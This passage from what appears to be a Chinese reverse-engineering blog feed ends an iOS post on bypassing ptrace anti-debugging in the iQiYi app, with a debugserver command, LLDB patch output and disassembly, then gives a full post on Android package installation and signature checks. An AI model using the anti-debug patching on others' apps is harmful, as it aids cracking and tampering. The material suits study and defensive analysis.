[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo</code></pre></li><li><p>LLDB挂上以后在main函数下断点以后直接执行<code>debugme</code>命令</p><pre><code>(lldb) debugmeKill antiDebug by xia0:[*] ptrace target address: 0x1837dc180 and offset: 0x180[*] mmap new page: 0x1021ec000 success. [+] vm_copy target to new page.[+] patch ret[0xc0 0x03 0x5f 0xd6] with memcpy[*] set new page back to r-x success![*] get page info done.[+] remap to target success![*] clear cache success![+] all done! happy debug~</code></pre><p>下面查看对比下patch前后指令ptrace首指令的变化</p><p>Patch之前</p><pre><code>(lldb) x/12i 0x00000001837dc180    0x1837dc180: 0xf00f26a9   adrp   x9, 124119    0x1837dc184: 0x91034129   add    x9, x9, #0xd0             ; =0xd0     0x1837dc188: 0xb900013f   str    wzr, [x9]    0x1837dc18c: 0xd2800350   mov    x16, #0x1a    0x1837dc190: 0xd4001001   svc    #0x80    0x1837dc194: 0x540000c3   b.lo   0x1837dc1ac               ; &lt;+44&gt;    0x1837dc198: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!    0x1837dc19c: 0x910003fd   mov    x29, sp    0x1837dc1a0: 0x97ff9b08   bl     0x1837c2dc0               ; cerror    0x1837dc1a4: 0x910003bf   mov    sp, x29    0x1837dc1a8: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10    0x1837dc1ac: 0xd65f03c0   ret</code></pre><p>Patch之后</p><pre><code>(lldb) x/12i 0x1837dc180    0x1837dc180: 0xd65f03c0   ret        0x1837dc184: 0x91034129   add    x9, x9, #0xd0             ; =0xd0     0x1837dc188: 0xb900013f   str    wzr, [x9]    0x1837dc18c: 0xd2800350   mov    x16, #0x1a    0x1837dc190: 0xd4001001   svc    #0x80    0x1837dc194: 0x540000c3   b.lo   0x1837dc1ac               ; &lt;+44&gt;    0x1837dc198: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!    0x1837dc19c: 0x910003fd   mov    x29, sp    0x1837dc1a0: 0x97ff9b08   bl     0x1837c2dc0               ; cerror    0x1837dc1a4: 0x910003bf   mov    sp, x29    0x1837dc1a8: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10    0x1837dc1ac: 0xd65f03c0   ret</code></pre><p>可以发现首地址已经变成了ret指令。</p></li><li><p>执行continue命令，发现爱奇艺已经能够正常调试。</p><pre><code>(lldb) cProcess 3176 resuming2019-08-13 17:22:17.283 iQiYiPhoneVideo[3176:161840] [plcrash]: init ok2019-08-13 17:22:17.790 iQiYiPhoneVideo[3176:161840] -[QYBaikePageDurationManager bk_appDidBecomeActive:]2019-08-13 17:22:17.922 iQiYiPhoneVideo[3176:161840] CoreData: Failed to load optimized model at path &#39;/var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/QYPGCDataModel.momd/QYPGCDataModel_970.omo&#39;2019-08-13 17:22:20.477 iQiYiPhoneVideo[3176:161840] OSStatus error: [-34018] Security error has occurred.2019-08-13 17:22:20.558 iQiYiPhoneVideo[3176:162000] OSStatus error: [-34018] Security error has occurred.3176:161840] Incorrect NSStringEncoding value 0x8000100 detected. Assuming NSASCIIStringEncoding. Will stop this compatiblity mapping behavior in the near future.ontainers/Data/Application/5C31FE18-9BA4-4B2D-80C6-68BF7F65855F/Library/Application Support/爱奇艺/0_im.sqlite</code></pre></li></ul><h4 id="总结-Todo"><a href="#总结-Todo" class="headerlink" title="总结/Todo"></a>总结/Todo</h4><p>这里只是简单的绕过了ptrace方式的反调试，针对直接用汇编写的反调试我的做法是静态内存搜索匹配svc位置，发现是调用26号系统调用则利用内存patch为nop。或者写一个简单的hook代码，hook所有的svc地址，判断寄存器的值然后进行hook即可，这样就能绕过这些反调试机制，再次向Zz和庆哥低头。</p><h4 id="参考-致谢"><a href="#参考-致谢" class="headerlink" title="参考/致谢"></a>参考/致谢</h4><ul><li><p><a href="https://gist.github.com/piaoger/4ba83f6a954bca113505" target="_blank" rel="external">https://gist.github.com/piaoger/4ba83f6a954bca113505</a></p></li><li><p><a href="https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c">https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c</a></p></li><li><p><a href="https://www.codercto.com/a/63507.html" target="_blank" rel="external">https://www.codercto.com/a/63507.html</a></p></li><li><p><a href="https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26">https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26</a></p></li><li><p><a href="https://github.com/gdbinit/readmem/blob/master/readmem/main.c">https://github.com/gdbinit/readmem/blob/master/readmem/main.c</a></p></li><li><p><a href="https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h">https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h</a></p></li><li><p><a href="http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c" target="_blank" rel="external">http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c</a></p></li><li><p><a href="https://github.com/DaKnOb/memscan/blob/master/main.mm">https://github.com/DaKnOb/memscan/blob/master/main.mm</a></p></li><li><p><a href="http://iosre.com/t/topic/8179" target="_blank" rel="external">http://iosre.com/t/topic/8179</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iOS-LLDB中反反调试分析与实现&quot;&gt;&lt;a href=&quot;#iOS-LLDB中反反调试分析与实现&quot; class=&quot;headerlink&quot; title=&quot;iOS LLDB中反反调试分析与实现&quot;&gt;&lt;/a&gt;iOS LLDB中反反调试分析与实现&lt;/h3&gt;&lt;h4 id=&quot;开
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>Android应用安装过程深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/</id>
    <published>2019-08-01T07:08:31.000Z</published>
    <updated>2019-08-01T10:29:23.735Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android应用安装过程深度解析"><a href="#Android应用安装过程深度解析" class="headerlink" title="Android应用安装过程深度解析"></a>Android应用安装过程深度解析</h3><blockquote><p>本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。</p></blockquote><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。</p><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>一个 Android 应用安装到手机上大致分为四种情形：</p><ul><li>系统应用，在设备每次启动时完成安装</li><li>通过 adb install 命令安装</li><li>应用市场安装，封装安装过程（略）</li><li>第三方应用安装或双击安装包，会启动系统应用引导安装</li></ul><p>无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。</p><h4 id="场景一：系统应用安装"><a href="#场景一：系统应用安装" class="headerlink" title="场景一：系统应用安装"></a>场景一：系统应用安装</h4><p>在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801151901799.png?raw=true" alt="image-20190801151901799"></p><p><strong>补充：system_server 的启动与运行流程</strong></p><p>system_server 由 zygote 进程孵化，是整个 Android Framework 的基础</p><p>zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152013042.png?raw=true" alt="image-20190801152013042"></p><p>ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信</p><p>RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法</p><p>SystemServer 的 run() 方法中会完成以下工作：</p><ul><li>设置时间、语言等，设置虚拟机库文件，设置内存</li><li>Looper.prepareMainLooper() 主线程 looper 运行在当前线程</li><li>加载库文件 android_servers，位于 /frameworks/base/services</li><li>createSystemContext() 初始化系统上下文</li><li>SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中</li><li>启动各种系统服务，包括引导服务、核心服务、其他服务</li><li>开启循环，等待其他线程通过 handler 发送消息到主线程来处理</li></ul><p>在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152050671.png?raw=true" alt="image-20190801152050671"></p><p>PackageManagerService 类构造函数中完成了许多工作，主要包含：</p><ul><li>创建 Settings 对象，添加系统的 SharedUser 信息</li><li>为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的</li><li>创建 PackageDexOptimizer 和 DexManager 对象</li><li>获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures</li><li>创建 ServiceThread 和 PackagerHandler 对象</li><li>创建 UserManagerService，支持多用户</li><li>读取系统定义的权限保存到 permConfig 变量中</li><li>读取系统共享库保存到 libConfig 变量中</li><li>解析 package.xml 文件中的内容保存到 ArrayMap<string, packageparser.package=""> 结构中</string,></li><li>配置扫描参数 scanFlags</li><li>开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app</li><li>开始扫描非系统应用，包括目录 /data/app、/data/app-private</li><li>启动内存垃圾回收</li><li>启动私有服务 PackageManagerInternal</li></ul><p>总结来说主要是这几项内容：</p><ul><li>创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接</li><li>扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理）</li><li>创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求</li><li>解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射</li></ul><p>详细说明各项：</p><p>Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152128607.png?raw=true" alt="image-20190801152128607"></p><p>Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152145965.png?raw=true" alt="image-20190801152145965"></p><p>构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量</p><p>重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接</p><p>connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中</p><p>Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装</p><p><strong>!!!!  Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现</strong></p><p><strong>PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理</strong></p><p>PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk</p><p>包括：</p><ul><li>系统应用，目录有 <code>/vender/overlay</code>、<code>/system/framework</code>、<code>/system/priv-app</code>、<code>/system/app</code>、<code>/vendor/app</code>、<code>/oem/app</code></li><li>非系统应用，目录有 <code>/data/app</code>、<code>/data/app-private</code></li></ul><p>调用的方法是 <code>scanDirTracedLI()</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152328199.png?raw=true" alt="image-20190801152328199"></p><p>可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI()</p><p>其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理</p><p>后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等</p><h4 id="场景二：adb-命令安装"><a href="#场景二：adb-命令安装" class="headerlink" title="场景二：adb 命令安装"></a>场景二：adb 命令安装</h4><p>adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建</p><p>源码路径为：<a href="http://androidxref.com/8.1.0_r33/xref/system/core/adb/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/system/core/adb/</a></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152448109.png?raw=true" alt="image-20190801152448109"></p><p>adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。</p><p>Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。</p><p>runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152518924.png?raw=true" alt="image-20190801152518924"></p><p>PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。</p><p>发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。</p><p>PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。</p><h4 id="场景三：第三方应用安装"><a href="#场景三：第三方应用安装" class="headerlink" title="场景三：第三方应用安装"></a>场景三：第三方应用安装</h4><p>当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作</p><p>PackageInstaller 的应用代码位于：<a href="http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/</a></p><p>安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152605993.png?raw=true" alt="image-20190801152605993"></p><p>应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。</p><p>然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。</p><p>用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152635344.png?raw=true" alt="image-20190801152635344"></p><p>InstallInstalling 这个类会拿到应用数据开启真正的安装流程。</p><p>首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。</p><p>接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。</p><p>最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去</p><p>这里就跟 adb 安装走到了同一个流程中。</p><h4 id="深入-PMS-中的安装"><a href="#深入-PMS-中的安装" class="headerlink" title="深入 PMS 中的安装"></a>深入 PMS 中的安装</h4><p>上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152711796.png?raw=true" alt="image-20190801152711796"></p><p>在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。</p><p>所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。</p><p><strong>1、处理 INIT_COPY 消息</strong></p><p>首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。</p><p><strong>2、处理 MCS_BOUND 消息</strong></p><p>首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152741833.png?raw=true" alt="image-20190801152741833"></p><p>HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中，</p><p>InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法</p><p>以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制</p><p>HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152755489.png?raw=true" alt="image-20190801152755489"></p><p> installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法</p><p>其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看  installNewPackageLI() 流程</p><p>installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF()</p><p><strong>3、处理 POST_INSTALL 消息</strong></p><p>首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等</p><h4 id="安装过程小结"><a href="#安装过程小结" class="headerlink" title="安装过程小结"></a>安装过程小结</h4><p>与应用相关的一些目录</p><ul><li><p>/system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力</p></li><li><p>/system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用</p></li><li><p>/data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下</p></li></ul><ul><li><p>/data/data：用户应用数据存放路径，存在沙箱隔离</p></li><li><p>/data/dalvik-cache：存放应用的dex 文件</p></li><li><p>/data/system：存放应用安装相关文件</p><ul><li>packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表</li><li>package.list 指定应用的默认存储位置，userid 等</li></ul></li></ul><p>应用安装过程总结</p><ol><li>将应用 apk 拷贝到指定目录下</li><li>解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/<packagename> 数据目录</packagename></li><li>解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中</li><li>由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上</li></ol><h4 id="PMS-与-PM-与APM"><a href="#PMS-与-PM-与APM" class="headerlink" title="PMS 与 PM 与APM"></a>PMS 与 PM 与APM</h4><p>前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152858658.png?raw=true" alt="image-20190801152858658"></p><p>通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象</p><p>ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理</p><p>继续梳理一下这个类与 PMS 之间的关系</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152915992.png?raw=true" alt="image-20190801152915992"></p><p>IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法</p><p>IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface</p><p>IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager</p><ul><li>asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象</li><li>asBinder() 方法返回自身，即 IPackageManager.Stub 对象</li><li>重写了 onTransact() 方法，根据命令类型处理数据传输</li></ul><p>IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口</p><ul><li>mRemote对象是IBinder类型，是对IPackageManager.Stub的引用</li><li>重写了asBinder()方法，返回mRemote</li><li>实现了AIDL文件定义的接口</li></ul><p>PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能：</p><ul><li>安装/卸载/更新应用，包括 installPackage/</li><li>查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表</li><li>查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象</li><li>查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象</li><li>增加/删除权限，包括 addPermission/removePermission</li><li>清除用户数据/缓存/代码等</li></ul><p>PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集</p><p>ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法</p><p>PackageManagerService 继承了 IPackageManager.Stub</p><p>因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://androidxref.com/8.1.0_r33/xref/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/</a></li><li><a href="https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6" target="_blank" rel="external">https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6</a></li><li><a href="http://solart.cc/2016/10/30/install_apk/" target="_blank" rel="external">http://solart.cc/2016/10/30/install_apk/</a></li><li><a href="https://www.jianshu.com/p/4f16421d5c7f" target="_blank" rel="external">https://www.jianshu.com/p/4f16421d5c7f</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android应用安装过程深度解析&quot;&gt;&lt;a href=&quot;#Android应用安装过程深度解析&quot; class=&quot;headerlink&quot; title=&quot;Android应用安装过程深度解析&quot;&gt;&lt;/a&gt;Android应用安装过程深度解析&lt;/h3&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-08-09T08:47:21.452Z</updated>
    
